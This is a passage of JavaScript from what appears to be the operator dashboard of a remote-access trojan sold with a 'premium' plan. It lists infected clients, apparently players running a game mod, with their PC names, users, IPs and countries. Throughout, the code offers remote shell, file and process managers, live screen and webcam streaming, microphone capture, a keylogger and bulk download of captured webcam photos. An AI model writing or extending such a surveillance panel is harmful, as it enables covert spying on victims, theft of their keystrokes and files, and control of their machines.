                                ${img.pc_name || 'Unknown'} / ${img.pc_user || 'N/A'}
                            </div>
                            <div class="webcam-meta">
                                <div class="webcam-meta-item">
                                    <i class="fas fa-clock"></i>
                                    ${dateStr}
                                </div>
                                <div class="webcam-meta-item">
                                    <i class="fas fa-globe"></i>
                                    ${img.country || 'Unknown'}
                                </div>
                                <div class="webcam-meta-item">
                                    <i class="fas fa-network-wired"></i>
                                    ${img.ip || 'N/A'}
                                </div>
                            </div>
                            <div style="margin-top: 8px; display: flex; gap: 8px;">
                                <button class="btn btn-sm btn-secondary" onclick="event.stopPropagation(); openLightbox('/api/webcam/image/${img.id}', '${lightboxTitle}')">
                                    <i class="fas fa-expand"></i> View Full
                                </button>
                                <a class="btn btn-sm btn-secondary" href="/api/webcam/image/${img.id}" download="webcam_${img.id}.jpg" onclick="event.stopPropagation();">
                                    <i class="fas fa-download"></i> Download
                                </a>
                            </div>
                        </div>
                    </div>
                `;
                }).join('');

            } catch (e) {
                console.error('Webcam error:', e);
            }
        }

        function openLightbox(src, info) {
            document.getElementById('lightboxImage').src = src;
            document.getElementById('lightboxInfo').innerHTML = `<i class="fas fa-user"></i> ${info}`;
            document.getElementById('webcamLightbox').classList.add('active');
            document.body.style.overflow = 'hidden';
        }

        function closeLightbox() {
            document.getElementById('webcamLightbox').classList.remove('active');
            document.body.style.overflow = '';
        }

        async function downloadAllWebcams() {
            showToast('Preparing download...', 'info');
            // Open each image in new tab for manual save (no zip library)
            const res = await api('/api/webcam');
            if (res.success && res.images) {
                res.images.forEach((img, i) => {
                    setTimeout(() => {
                        const a = document.createElement('a');
                        a.href = `/api/webcam/image/${img.id}`;
                        a.download = `webcam_${img.pc_name || 'unknown'}_${img.id}.jpg`;
                        a.click();
                    }, i * 200);
                });
                showToast(`Downloading ${res.images.length} images...`, 'success');
            }
        }

        // Close lightbox with Escape
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') closeLightbox();
        });

        // ==================== REMOTE CONTROL FUNCTIONS ====================
        let screenshareInterval = null;
        let screensharePlayer = null;
        let lastScreenshotId = null;
        let commandRefreshInterval = null;

        // Selected player processing
        let selectedCmdPlayer = null;

        function selectPlayerForCmd(playerName) {
            selectedCmdPlayer = playerName;

            // Dynamic Rendering based on Plan
            const isPremium = currentUser && currentUser.plan === 'premium';
            const safeName = playerName.replace(/[^a-zA-Z0-9]/g, '_');

            // Highlight row
            document.querySelectorAll('#remotePlayersTable tr').forEach(tr => tr.classList.remove('bg-white/5'));
            const row = document.getElementById('row-' + safeName);
            if (row) row.classList.add('bg-white/5');

            // Build Panel Content
            let systemButtons = `
                <button class="btn btn-secondary w-full justify-start gap-3" onclick="openShellModal(selectedCmdPlayer)">
                    <i class="fas fa-terminal text-blue-400"></i> Remote Shell
                </button>
            `;

            let surveillanceButtons = '';
            let actionButtons = '';

            if (isPremium) {
                // Premium: All buttons
                systemButtons += `
                    <button class="btn btn-secondary w-full justify-start gap-3" onclick="openProcessManager(selectedCmdPlayer)">
                        <i class="fas fa-microchip text-yellow-400"></i> Process Manager
                    </button>
                    <button class="btn btn-secondary w-full justify-start gap-3" onclick="openFileManager(selectedCmdPlayer)">
                        <i class="fas fa-folder text-purple-400"></i> File Manager
                    </button>
                `;

                surveillanceButtons = `
                    <div class="flex flex-col gap-2">
                        <button class="btn btn-secondary w-full justify-start gap-3" onclick="openScreenshareModal(selectedCmdPlayer); startScreenshareModal();">
                            <i class="fas fa-desktop text-green-400"></i> Live Screen
                        </button>
                        <button class="btn btn-secondary w-full justify-start gap-3" onclick="openWebcamModal(selectedCmdPlayer); startWebcamModal();">
                            <i class="fas fa-camera text-red-400"></i> Webcam Stream
                        </button>
                        <button class="btn btn-secondary w-full justify-start gap-3" onclick="startKeylogger(selectedCmdPlayer)">
                            <i class="fas fa-keyboard text-orange-400"></i> Start Keylogger
                        </button>
                    </div>
                `;

                actionButtons = `
                    <div class="flex flex-col gap-2">
                        <button class="btn btn-secondary w-full justify-start gap-3" onclick="requestPreviewScreenshot(selectedCmdPlayer)">
                            <i class="fas fa-image text-cyan-400"></i> Quick Screenshot
                        </button>
                        <button class="btn btn-secondary w-full justify-start gap-3" onclick="sendNotificationTest(selectedCmdPlayer)">
                            <i class="fas fa-bell text-pink-400"></i> Send Toast (Msg)
                        </button>
                        <button class="btn btn-secondary w-full justify-start gap-3 text-red-400 hover:bg-red-500/10" onclick="killClient(selectedCmdPlayer)">
                            <i class="fas fa-skull"></i> Terminate Client
                        </button>
                    </div>
                `;
            } else {
                // Free: Placeholders
                const locked = (name) => `
                    <div class="opacity-50 border border-dashed border-gray-600 rounded p-3 text-center text-xs w-full">
                        <i class="fas fa-lock text-yellow-500 mb-1"></i><br>${name} (Premium)
                    </div>`;

                systemButtons += `
                    <div class="flex flex-col gap-2 mt-2">
                        ${locked('Process Manager')}
                        ${locked('File Manager')}
                    </div>
                `;

                surveillanceButtons = `<div class="flex flex-col gap-2">${locked('Live Screen')}${locked('Webcam')}${locked('Keylogger')}</div>`;
                actionButtons = `<div class="flex flex-col gap-2">${locked('Screenshot')}${locked('Toast Msg')}${locked('Terminate')}</div>`;
            }

            const panelContent = `
                <div class="flex justify-between items-center mb-4">
                    <div class="flex items-center gap-3">
                        <div class="w-10 h-10 rounded-full bg-accent/20 flex items-center justify-center text-accent">
                            <i class="fas fa-terminal"></i>
                        </div>
                        <div>
                            <h3 class="font-bold text-lg" id="cmdPanelPlayer">${playerName}</h3>
                            <p class="text-xs text-muted" id="cmdPanelStatus">Ready</p>
                        </div>
                    </div>
                    <button class="btn btn-sm btn-ghost text-muted hover:text-white" onclick="document.getElementById('commandCenterPanel').classList.add('hidden')">
                        <i class="fas fa-times"></i>
                    </button>
                </div>

                <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <!-- Power Ops -->
                    <div class="glass-card p-4 border border-white/5 hover:border-accent/30 transition-all">
                        <h4 class="text-sm font-bold text-gray-400 mb-3 uppercase tracking-wider">System</h4>
                        <div class="flex flex-col gap-2">
                            ${systemButtons}
                        </div>
                    </div>

                    <!-- Spy Ops -->
                    <div class="glass-card p-4 border border-white/5 hover:border-accent/30 transition-all">
                        <h4 class="text-sm font-bold text-gray-400 mb-3 uppercase tracking-wider">Surveillance</h4>
                        ${surveillanceButtons}
                    </div>

                    <!-- Fun/Misc -->
                    <div class="glass-card p-4 border border-white/5 hover:border-accent/30 transition-all">
                        <h4 class="text-sm font-bold text-gray-400 mb-3 uppercase tracking-wider">Actions</h4>
                        ${actionButtons}
                    </div>
                </div>
            `;

            const panel = document.getElementById('commandCenterPanel');
            panel.innerHTML = panelContent;
            panel.classList.remove('hidden');

            // Scroll to panel
            panel.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }

        async function loadRemotePlayers() {
            try {
                const res = await api('/api/remote/players');
                if (!res.success) return;

                const players = res.players || [];

                // Update counters
                document.getElementById('remoteOnlineCount').textContent = players.filter(p => p.server === 'Guardian' || p.connected).length;
                document.getElementById('remoteGuardianCount').textContent = players.filter(p => p.source === 'guardian' || (p.type && p.type.includes('guardian'))).length;
                document.getElementById('remoteModCount').textContent = players.filter(p => p.source === 'mod' || (!p.source && !p.type)).length;

                const tableBody = document.getElementById('remotePlayersTable');
                if (players.length === 0) {
                    tableBody.innerHTML = `<tr><td colspan="7" style="text-align:center; padding: 40px; color: var(--text-muted);">
                        <i class="fas fa-ghost" style="font-size: 24px; margin-bottom: 10px;"></i><br>No clients online
                    </td></tr>`;
                    return;
                }

                tableBody.innerHTML = players.map(p => {
                    const playerName = p.player || p.name || 'Unknown';
                    const safeName = playerName.replace(/[^a-zA-Z0-9]/g, '_');
                    const isOnline = p.connected || p.server === 'Guardian';
                    const statusColor = isOnline ? 'text-green-400' : 'text-red-400';
                    const statusText = isOnline ? 'ONLINE' : 'OFFLINE';
                    const statusIcon = isOnline ? 'fa-circle' : 'fa-circle-xmark';

                    const isGuardian = p.source === 'guardian' || playerName.startsWith('Guardian_');
                    const badges = isGuardian
                        ? `<span class="px-2 py-1 rounded bg-blue-500/20 text-blue-400 text-xs font-bold border border-blue-500/30">GO</span>`
                        : `<span class="px-2 py-1 rounded bg-orange-500/20 text-orange-400 text-xs font-bold border border-orange-500/30">JAVA</span>`;

                    let osIcon = '<i class="fab fa-windows text-blue-300"></i>';
                    if (playerName.toLowerCase().includes('linux')) osIcon = '<i class="fab fa-linux text-yellow-300"></i>';

                    return `
                    <tr id="row-${safeName}" class="hover:bg-white/5 transition-colors cursor-pointer border-b border-white/5 last:border-0" onclick="selectPlayerForCmd('${playerName}')">
                        <td class="p-4">
                            <span class="${statusColor} font-bold text-xs flex items-center gap-2">
                                <i class="fas ${statusIcon} text-[10px]"></i> ${statusText}
                            </span>
                        </td>
                        <td class="p-4">
                            ${badges}
                        </td>
                        <td class="p-4">
                            <div class="font-bold text-white">${playerName}</div>
                            <div class="text-xs text-muted">${p.pc_user || 'Unknown'}</div>
                        </td>
                        <td class="p-4">
                            <div class="flex items-center gap-2 text-sm text-gray-400">
                                ${osIcon} ${p.pc_name || 'PC'}
                            </div>
                        </td>
                        <td class="p-4">
                            <div class="text-sm">${p.ip || 'Unknown'}</div>
                            <div class="text-xs text-muted">${p.country || 'Unknown'}</div>
                        </td>
                        <td class="p-4 text-xs text-muted font-mono">
                            ${new Date(p.last_seen).toLocaleTimeString()}
                        </td>
                        <td class="p-4 text-right">
                           <button class="btn btn-sm btn-primary glass-btn" onclick="event.stopPropagation(); selectPlayerForCmd('${playerName}')">
                                Control <i class="fas fa-chevron-right ml-1"></i>
                           </button>
                        </td>
                    </tr>
                    `;
                }).join('');

                if (selectedCmdPlayer) {
                    const row = document.getElementById('row-' + selectedCmdPlayer.replace(/[^a-zA-Z0-9]/g, '_'));
                    if (row) row.classList.add('bg-white/5');
                }

                // === POPULATE ALL PLAYER DROPDOWNS ===
                const dropdownIds = ['shellPlayerSelect', 'filesPlayerSelect', 'processPlayerSelect', 'keylogPlayerSelect'];
                dropdownIds.forEach(id => {
                    const select = document.getElementById(id);
                    if (select) {
                        const currentValue = select.value;
                        // Keep first option (placeholder)
                        const placeholder = select.options[0] ? select.options[0].outerHTML : '<option value="">-- Select Player --</option>';
                        select.innerHTML = placeholder;

                        players.forEach(p => {
                            const playerName = p.player || 'Unknown';
                            const opt = document.createElement('option');
                            opt.value = playerName;
                            opt.textContent = playerName;
                            select.appendChild(opt);
                        });

                        // Restore selection if still valid
                        if (currentValue && players.find(p => p.player === currentValue)) {
                            select.value = currentValue;
                        }
                    }
                });

            } catch (e) {
                console.error('Load remote error', e);
            }
        }

        // Alias for backwards compatibility
        async function loadOnlinePlayersForRemote() {
            await loadRemotePlayers();
        }

        function openRemoteForPlayer(player) {
            // Quick access modal for a player
            const isPremium = currentUser && currentUser.plan === 'premium';

            let buttons = `
                <button class="btn btn-primary" onclick="closeModal(); showPage('shell'); document.getElementById('shellPlayerSelect').value='${player}';" style="padding: 20px;">
                    <i class="fas fa-terminal" style="font-size: 24px; display: block; margin-bottom: 8px;"></i>
                    Remote Shell
                </button>
            `;

            if (isPremium) {
                buttons += `
                    <button class="btn btn-primary" onclick="closeModal(); openScreenshareModal('${player}'); startScreenshareModal();" style="padding: 20px;">
                        <i class="fas fa-tv" style="font-size: 24px; display: block; margin-bottom: 8px;"></i>
                        Screenshare
                    </button>
                    <button class="btn btn-primary" onclick="closeModal(); openWebcamModal('${player}'); startWebcamModal();" style="padding: 20px;">
                        <i class="fas fa-camera" style="font-size: 24px; display: block; margin-bottom: 8px;"></i>
                        Webcam
                    </button>
                    <button class="btn btn-primary" onclick="closeModal(); showPage('keylogger'); startKeyloggerForPlayer('${player}');" style="padding: 20px;">
                        <i class="fas fa-keyboard" style="font-size: 24px; display: block; margin-bottom: 8px;"></i>
                        Keylogger
                    </button>
                    <button class="btn btn-primary" onclick="closeModal(); showPage('files'); document.getElementById('filesPlayerSelect').value='${player}'; browseToPath();" style="padding: 20px;">
                        <i class="fas fa-folder-open" style="font-size: 24px; display: block; margin-bottom: 8px;"></i>
                        File Manager
                    </button>
                `;
            } else {
                buttons += `
                    <div style="opacity: 0.5; padding: 20px; border: 1px dashed var(--border); border-radius: 8px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center;">
                        <i class="fas fa-lock" style="font-size: 24px; margin-bottom: 8px; color: var(--warning);"></i>
                        <span style="font-size: 11px;">Screenshare (Premium)</span>
                    </div>
                     <div style="opacity: 0.5; padding: 20px; border: 1px dashed var(--border); border-radius: 8px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center;">
                        <i class="fas fa-lock" style="font-size: 24px; margin-bottom: 8px; color: var(--warning);"></i>
                        <span style="font-size: 11px;">Webcam (Premium)</span>
                    </div>
                     <div style="opacity: 0.5; padding: 20px; border: 1px dashed var(--border); border-radius: 8px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center;">
                        <i class="fas fa-lock" style="font-size: 24px; margin-bottom: 8px; color: var(--warning);"></i>
                        <span style="font-size: 11px;">Keylogger (Premium)</span>
                    </div>
                     <div style="opacity: 0.5; padding: 20px; border: 1px dashed var(--border); border-radius: 8px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center;">
                        <i class="fas fa-lock" style="font-size: 24px; margin-bottom: 8px; color: var(--warning);"></i>
                        <span style="font-size: 11px;">Files (Premium)</span>
                    </div>
                 `;
            }

            showModal('Remote Control: ' + player, `
                <div style= "display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px;">
                    ${buttons}
                </div>
                <div style="margin-top: 20px; text-align: center;">
                    <button class="btn btn-secondary" onclick="closeModal()">Cancel</button>
                </div>
            `);
        }

        // ==================== SCREENSHARE MODAL ====================
        let screenshareModalInterval = null;
        let screenshareModalPlayer = null;
        let screenshareLastId = null;
        let screenshareFpsCounter = 0;
        let screenshareFpsTimer = null;
        let screenshareSoundEnabled = false;
        let screenshareAudioInterval = null;
        let screenshareUsingWebSocket = false;

        // Helper functions for Command Center buttons
        function openShellModal(player) {
            if (!player) { showToast('Select a player first', 'error'); return; }
            showPage('shell');
            const select = document.getElementById('shellPlayerSelect');
            if (select) select.value = player;
        }

        function openProcessManager(player) {
            if (!player) { showToast('Select a player first', 'error'); return; }
            showPage('process');
            const select = document.getElementById('processPlayerSelect');
            if (select) select.value = player;
            loadProcessList();
        }

        function openFileManager(player) {
            if (!player) { showToast('Select a player first', 'error'); return; }
            showPage('files');
            const select = document.getElementById('filesPlayerSelect');
            if (select) select.value = player;
            browseToPath();
        }

        function openScreenshareModal(player) {
            screenshareModalPlayer = player;
            document.getElementById('screenshareModalPlayer').textContent = player;
            document.getElementById('screenshareModal').classList.add('active');
            document.body.style.overflow = 'hidden';

            // Reset state and clear image
            const img = document.getElementById('screenshareModalImage');
            if (img) {
                img.src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"/>';
                img.style.display = 'none';
            }
            document.getElementById('screenshareModalPlaceholder').style.display = 'block';
            document.getElementById('screenshareStartBtn').style.display = 'inline-flex';
            document.getElementById('screenshareStopBtn').style.display = 'none';
            updateScreenshareStatus(false);

            // Initialize WebSocket
            initSocket();

            // Add click outside to close
            document.getElementById('screenshareModal').onclick = function (e) {
                if (e.target === this) {
                    closeScreenshareModal();
                }
            };
        }

        function closeScreenshareModal() {
            stopScreenshareModal();
            stopScreenshareAudio();

            // Clear image on close to prevent ghosting
            const img = document.getElementById('screenshareModalImage');
            if (img) {
                img.src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"/>';
                img.style.display = 'none';
            }

            // Leave WebSocket stream
            if (screenshareModalPlayer) {
                leaveStream(screenshareModalPlayer, 'screen');
            }

            // Reset sound button
            screenshareSoundEnabled = false;
            const soundBtn = document.getElementById('screenshareSoundBtn');
            if (soundBtn) {
                soundBtn.innerHTML = '<i class="fas fa-volume-up"></i> Sound On';
                soundBtn.className = 'btn btn-secondary';
            }

            document.getElementById('screenshareModal').classList.remove('active');
            document.body.style.overflow = '';
            screenshareModalPlayer = null;
            screenshareUsingWebSocket = false;
        }

        function updateScreenshareStatus(streaming) {
            const status = document.getElementById('screenshareModalStatus');
            if (streaming) {
                status.className = 'screenshare-modal-status streaming';
                status.innerHTML = '<i class="fas fa-circle" style="animation: pulse 1s infinite;"></i> <span>Live Streaming</span>';
            } else {
                status.className = 'screenshare-modal-status stopped';
                status.innerHTML = '<i class="fas fa-circle"></i> <span>Stopped</span>';
            }
        }

        async function startScreenshareModal() {
            try {
                if (!screenshareModalPlayer) return;

                document.getElementById('screenshareStartBtn').style.display = 'none';
                document.getElementById('screenshareStopBtn').style.display = 'inline-flex';
                document.getElementById('screenshareModalPlaceholder').style.display = 'none';
                document.getElementById('screenshareModalImage').style.display = 'block';
                updateScreenshareStatus(true);

                // Join WebSocket stream room - primary source
                joinStream(screenshareModalPlayer, 'screen');
                screenshareUsingWebSocket = true;

                // Get quality and fps from UI (defaults: 80, 30)
                const quality = parseInt(document.getElementById('streamQualitySlider')?.value || '80');
                const fps = parseInt(document.getElementById('streamFpsSlider')?.value || '30');
                window.streamQuality = quality;
                window.streamFps = fps;

                // Request Guardian to start streaming with quality params
                requestStartStream(screenshareModalPlayer, 'screen', quality, fps);

                // NOTE: Removed HTTP polling - it was overwriting WebSocket frames!
                // WebSocket streaming is the primary method now
                // fetchScreenshotModal is only used as manual refresh button

                // Clear any existing polling (just in case)
                if (screenshareModalInterval) {
                    clearInterval(screenshareModalInterval);
                    screenshareModalInterval = null;
                }

                // Start FPS counter (counts ACTUAL frames from WebSocket, not HTTP polls)
                screenshareFpsCounter = 0;
                if (screenshareFpsTimer) clearInterval(screenshareFpsTimer);
                screenshareFpsTimer = setInterval(() => {
                    const quality = window.streamQuality || 80;
                    document.getElementById('screenshareFps').textContent = screenshareFpsCounter + ' FPS | Quality: ' + quality;
                    screenshareFpsCounter = 0;
                }, 1000);

                toast(' Live Screenshare started (WebSocket + TCP optimized)');
            } catch (e) {
                console.error('startScreenshareModal error:', e);
                toast('Error starting screenshare: ' + e.message, 'error');
            }
        }

        function stopScreenshareModal() {
            // Stop WebSocket stream
            if (screenshareModalPlayer && screenshareUsingWebSocket) {
                requestStopStream(screenshareModalPlayer, 'screen');
                leaveStream(screenshareModalPlayer, 'screen');
            }

            // Clear any polling intervals
            if (screenshareModalInterval) {
                clearInterval(screenshareModalInterval);
                screenshareModalInterval = null;
            }
            if (screenshareFpsTimer) {
                clearInterval(screenshareFpsTimer);
                screenshareFpsTimer = null;
            }

            document.getElementById('screenshareStartBtn').style.display = 'inline-flex';
            document.getElementById('screenshareStopBtn').style.display = 'none';
            updateScreenshareStatus(false);
            document.getElementById('screenshareFps').textContent = '0 FPS';
            screenshareUsingWebSocket = false;
            screenshareFpsCounter = 0;
        }

        function toggleScreenshareSound() {
            screenshareSoundEnabled = !screenshareSoundEnabled;
            const soundBtn = document.getElementById('screenshareSoundBtn');

            if (screenshareSoundEnabled) {
                soundBtn.innerHTML = '<i class="fas fa-volume-mute"></i> Sound Off';
                soundBtn.className = 'btn btn-success';

                // Start audio polling if screenshare is active
                if (screenshareModalPlayer && screenshareModalInterval) {
                    startScreenshareAudio();
                }

                toast('Screenshare sound enabled');
            } else {
                soundBtn.innerHTML = '<i class="fas fa-volume-up"></i> Sound On';
                soundBtn.className = 'btn btn-secondary';

                // Stop audio polling
                stopScreenshareAudio();

                toast('Screenshare sound disabled');
            }
        }

        function startScreenshareAudio() {
            if (screenshareAudioInterval) clearInterval(screenshareAudioInterval);
            screenshareAudioInterval = setInterval(fetchScreenshareAudio, 1000); // Poll audio every second
        }

        function stopScreenshareAudio() {
            if (screenshareAudioInterval) {
                clearInterval(screenshareAudioInterval);
                screenshareAudioInterval = null;
            }
        }

        async function fetchScreenshareAudio() {
            if (!screenshareModalPlayer || !screenshareSoundEnabled) return;

            try {
                // Request audio capture from Guardian
                await api('/api/remote/command', 'POST', {
                    target_player: screenshareModalPlayer,
                    command_type: 'audio',
                    command_data: 'capture'
                });

                // Wait a moment for capture, then fetch
                await new Promise(r => setTimeout(r, 500));

                const res = await api(`/api/audio/latest?player=${encodeURIComponent(screenshareModalPlayer)} `);
                if (res.success && res.audio) {
                    // Get volume from slider
                    const volSlider = document.getElementById('screenshareVolume');
                    const vol = volSlider ? volSlider.value / 100 : 0.5;

                    // Create audio element and play
                    const audio = new Audio('data:audio/mp3;base64,' + res.audio);
                    audio.volume = vol;
                    audio.play().catch(e => {
                        console.log('Audio autoplay blocked - click anywhere first:', e);
                    });
                }
            } catch (e) {
                // Ignore audio fetch errors
            }
        }

        async function fetchScreenshotModal() {
            if (!screenshareModalPlayer) return;

            try {
                const res = await api(`/api/screenshots/latest/${screenshareModalPlayer} `);

                if (res.success && res.id) {
                    const img = document.getElementById('screenshareModalImage');
                    if (img && img.style.display !== 'none') {
                        const newUrl = `/api/screenshots/image/${res.id}?t=${Date.now()} `;
                        img.src = newUrl;
                        img.style.display = 'block';
                    }
                    document.getElementById('screenshareModalPlaceholder').style.display = 'none';

                    // Update FPS counter
                    screenshareFpsCounter++;
                }
            } catch (e) {
                // Silent fail - continue polling
            }
        }

        async function requestScreenshotModal() {
            if (!screenshareModalPlayer) return;

            await api('/api/remote/command', 'POST', {
                target_player: screenshareModalPlayer,
                command_type: 'screenshot',
                command_data: 'single'
            });
            toast('Screenshot requested');
        }

        function toggleFullscreen() {
            const modal = document.getElementById('screenshareModal');
            if (!document.fullscreenElement) {
                modal.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        // ==================== VOLUME CONTROLS ====================
        let screenshareMuted = false;
        let webcamMuted = false;

        function setScreenshareVolume(val) {
            const audio = document.getElementById('screenshareAudio');
            if (audio) {
                audio.volume = val / 100;
            }
            document.getElementById('screenshareVolumeVal').textContent = val + '%';
            if (val == 0) {
                document.getElementById('screenshareMuteBtn').className = 'fas fa-volume-mute';
                screenshareMuted = true;
            } else {
                document.getElementById('screenshareMuteBtn').className = 'fas fa-volume-up';
                screenshareMuted = false;
            }
        }

        function toggleScreenshareMute() {
            screenshareMuted = !screenshareMuted;
            const audio = document.getElementById('screenshareAudio');
            const slider = document.getElementById('screenshareVolume');
            const btn = document.getElementById('screenshareMuteBtn');

            if (screenshareMuted) {
                if (audio) audio.volume = 0;
                btn.className = 'fas fa-volume-mute';
                document.getElementById('screenshareVolumeVal').textContent = '0%';
            } else {
                const vol = slider.value;
                if (audio) audio.volume = vol / 100;
                btn.className = 'fas fa-volume-up';
                document.getElementById('screenshareVolumeVal').textContent = vol + '%';
            }
        }

        function setWebcamVolume(val) {
            const audio = document.getElementById('webcamAudio');
            if (audio) {
                audio.volume = val / 100;
            }
            document.getElementById('webcamVolumeVal').textContent = val + '%';
            if (val == 0) {
                document.getElementById('webcamMuteBtn').className = 'fas fa-volume-mute';
                webcamMuted = true;
            } else {
                document.getElementById('webcamMuteBtn').className = 'fas fa-volume-up';
                webcamMuted = false;
            }
        }

        function toggleWebcamMute() {
            webcamMuted = !webcamMuted;
            const audio = document.getElementById('webcamAudio');
            const slider = document.getElementById('webcamVolume');
            const btn = document.getElementById('webcamMuteBtn');

            if (webcamMuted) {
                if (audio) audio.volume = 0;
                btn.className = 'fas fa-volume-mute';
                document.getElementById('webcamVolumeVal').textContent = '0%';
            } else {
                const vol = slider.value;
                if (audio) audio.volume = vol / 100;
                btn.className = 'fas fa-volume-up';
                document.getElementById('webcamVolumeVal').textContent = vol + '%';
            }
        }

        // ESC key to close
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape' && document.getElementById('screenshareModal').classList.contains('active')) {
                closeScreenshareModal();
            }
            if (e.key === 'Escape' && document.getElementById('webcamModal').classList.contains('active')) {
                closeWebcamModal();
            }
        });

        // ==================== WEBCAM MODAL ====================
        let webcamModalInterval = null;
        let webcamModalPlayer = null;
        let webcamLastId = null;
        let webcamFpsCounter = 0;
        let webcamFpsTimer = null;
        let webcamUsingWebSocket = false;
        let webcamSoundEnabled = false;
        let webcamAudioInterval = null;

        function toggleWebcamSound() {
            webcamSoundEnabled = !webcamSoundEnabled;
            const soundBtn = document.getElementById('webcamSoundBtn');

            if (webcamSoundEnabled) {
                soundBtn.innerHTML = '<i class="fas fa-volume-mute"></i> Sound Off';
                soundBtn.className = 'btn btn-success';

                // Start audio polling if webcam is active
                if (webcamModalPlayer && webcamModalInterval) {
                    startWebcamAudio();
                }

                toast('Webcam sound enabled');
            } else {
                soundBtn.innerHTML = '<i class="fas fa-volume-up"></i> Sound On';
                soundBtn.className = 'btn btn-secondary';

                stopWebcamAudio();

                toast('Webcam sound disabled');
            }
        }

        function startWebcamAudio() {
            if (webcamAudioInterval) clearInterval(webcamAudioInterval);
            webcamAudioInterval = setInterval(fetchWebcamAudio, 3500); // Audio every 3.5 seconds (capture takes 3s)
        }

        function stopWebcamAudio() {
            if (webcamAudioInterval) {
                clearInterval(webcamAudioInterval);
                webcamAudioInterval = null;
            }
        }

        async function fetchWebcamAudio() {
            if (!webcamModalPlayer || !webcamSoundEnabled) return;

            try {
                // Request audio capture from Guardian
                await api('/api/remote/command', 'POST', {
                    target_player: webcamModalPlayer,
                    command_type: 'audio',
                    command_data: 'capture'
                });

                // Wait for capture, then fetch
                await new Promise(r => setTimeout(r, 3200));

                const res = await api(`/api/audio/latest?player=${encodeURIComponent(webcamModalPlayer)} `);
                if (res.success && res.audio) {
                    // Get volume from slider
                    const volSlider = document.getElementById('webcamVolume');
                    const vol = volSlider ? volSlider.value / 100 : 0.5;

                    // Create audio element and play
                    const audio = new Audio('data:audio/mp3;base64,' + res.audio);
                    audio.volume = vol;
                    audio.play().catch(e => {
                        console.log('Audio autoplay blocked:', e);
                    });
                }
            } catch (e) {
                // Ignore audio fetch errors
            }
        }

        function openWebcamModal(player) {
            webcamModalPlayer = player;
            document.getElementById('webcamModalPlayer').textContent = player;
            document.getElementById('webcamModal').classList.add('active');
            document.body.style.overflow = 'hidden';

            // Clear previous image to prevent ghost frames
            const img = document.getElementById('webcamModalImage');
            if (img) {
                img.src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"/>'; // Clear with empty SVG
                img.style.display = 'none';
            }
            document.getElementById('webcamModalPlaceholder').style.display = 'block';

            // Initialize WebSocket
            initSocket();

            // Reset state
            document.getElementById('webcamStartBtn').style.display = 'inline-flex';
            document.getElementById('webcamStopBtn').style.display = 'none';
            updateWebcamStatus(false);
        }

        function closeWebcamModal() {
            stopWebcamModal();
            stopWebcamAudio();

            // Clear image on close
            const img = document.getElementById('webcamModalImage');
            if (img) {
                img.src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"/>';
                img.style.display = 'none';
            }

            // Reset sound button
            webcamSoundEnabled = false;
            const soundBtn = document.getElementById('webcamSoundBtn');
            if (soundBtn) {
                soundBtn.innerHTML = '<i class="fas fa-volume-up"></i> Sound On';
                soundBtn.className = 'btn btn-secondary';
            }

            // Leave WebSocket room
            if (webcamUsingWebSocket && webcamModalPlayer) {
                leaveStream(webcamModalPlayer, 'webcam');
                webcamUsingWebSocket = false;
            }

            document.getElementById('webcamModal').classList.remove('active');
            document.body.style.overflow = '';
            webcamModalPlayer = null;
        }

        function updateWebcamStatus(streaming) {
            const status = document.getElementById('webcamModalStatus');
            if (streaming) {
                status.className = 'screenshare-modal-status streaming';
                const wsIndicator = webcamUsingWebSocket ? ' (WebSocket)' : '';
                status.innerHTML = '<i class="fas fa-circle" style="animation: pulse 1s infinite;"></i> <span>Streaming' + wsIndicator + '</span>';
            } else {
                status.className = 'screenshare-modal-status stopped';
                status.innerHTML = '<i class="fas fa-circle"></i> <span>Stopped</span>';
            }
        }

        async function startWebcamModal() {
            try {
                if (!webcamModalPlayer) return;

                const startBtn = document.getElementById('webcamStartBtn');
                const stopBtn = document.getElementById('webcamStopBtn');
                const placeholder = document.getElementById('webcamModalPlaceholder');
                const imageEl = document.getElementById('webcamModalImage');
                const audioStatus = document.getElementById('webcamAudioStatus');
                const fpsEl = document.getElementById('webcamFps');
                const statsEl = document.getElementById('webcamStats');

                if (startBtn) startBtn.style.display = 'none';
                if (stopBtn) stopBtn.style.display = 'inline-flex';
                if (placeholder) placeholder.style.display = 'none';
                if (imageEl) imageEl.style.display = 'block';
                if (audioStatus) {
                    audioStatus.textContent = 'Waiting...';
                    audioStatus.style.color = 'var(--text-secondary)';
                }

                // Start FPS counter and stats
                webcamFpsCounter = 0;
                if (webcamFpsTimer) clearInterval(webcamFpsTimer);
                webcamFpsTimer = setInterval(() => {
                    const quality = window.webcamQuality || 80;
                    if (fpsEl) fpsEl.textContent = webcamFpsCounter + ' FPS | Quality: ' + quality;
                    if (statsEl) statsEl.textContent = webcamFpsCounter + ' fps  Live';
                    webcamFpsCounter = 0;
                }, 1000);

                // Get quality and fps from UI (defaults: 80, 30)
                const quality = parseInt(document.getElementById('webcamQualitySlider')?.value || '80');
                const fps = parseInt(document.getElementById('webcamFpsSlider')?.value || '30');
                window.webcamQuality = quality;
                window.webcamFps = fps;

                // Use WebSocket if available
                if (socket && socket.connected) {
                    webcamUsingWebSocket = true;
                    joinStream(webcamModalPlayer, 'webcam');
                    requestStartStream(webcamModalPlayer, 'webcam', quality, fps);
                    updateWebcamStatus(true);
                    toast('Webcam started via WebSocket for ' + webcamModalPlayer);
                } else {
                    // Fallback to HTTP polling
                    webcamUsingWebSocket = false;
                    updateWebcamStatus(true);

                    // Send webcam command via HTTP
                    await api('/api/remote/command', 'POST', {
                        target_player: webcamModalPlayer,
                        command_type: 'webcam',
                        command_data: 'continuous'
                    });

                    // Start polling for webcam images (200ms = ~5 FPS)
                    if (webcamModalInterval) clearInterval(webcamModalInterval);
                    webcamModalInterval = setInterval(fetchWebcamModal, 200);

